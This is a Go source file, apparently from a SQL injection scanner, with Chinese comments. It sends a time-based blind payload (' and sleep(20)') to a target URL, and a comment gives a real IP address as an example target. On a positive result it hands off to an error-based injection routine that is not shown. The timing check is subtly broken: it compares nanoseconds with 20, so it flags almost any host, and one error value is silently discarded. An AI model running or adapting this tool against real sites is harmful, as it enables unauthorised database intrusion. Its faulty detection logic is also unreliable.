package pkg

import (
	"fmt"
	"net/http"
	"net/url"
	"time"
)

// http://47.108.225.199:8080/?id=1
func Request(host string) error {
	//测试是否存在sql注入
	ex, err := checkSql(host)
	if err != nil {
		fmt.Errorf("检测失败")
		return err
	}
	if ex == 1 {
		fmt.Println("存在sql注入漏洞")
		err = errorInject(host)
		if err != nil {
			return err
		}
	}
	return nil

}

func checkSql(host string) (int, error) {
	payload := host + url.QueryEscape(" and sleep(20)")
	fmt.Printf("payload: %s\n", payload)
	startRequestTime := time.Now()
	req, err := http.Get(payload)
	//endRequestTime := time.Now().sub(start)
	endRequestTime := time.Since(startRequestTime)
	if err != nil {
		return 0, err
	}
	defer req.Body.Close()
	if req.StatusCode == 200 && int(endRequestTime) > 20 {
		return 1, nil
	}
	return 0, err
}
